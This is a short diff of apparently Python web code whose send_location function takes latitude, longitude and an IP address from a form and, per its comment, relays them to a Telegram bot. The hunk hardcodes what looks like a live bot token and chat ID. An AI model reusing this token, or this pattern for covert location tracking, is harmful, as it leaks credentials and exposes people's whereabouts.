@@ -12,7 +12,7 @@ def send_location():
     latitude = request.form['latitude']
     longitude = request.form['longitude']
     ip_address = request.form['ip_address']
-    
+    #
     # Send the location and IP address to Telegram using the Telegram Bot API
     bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
     chat_id = '373715044'
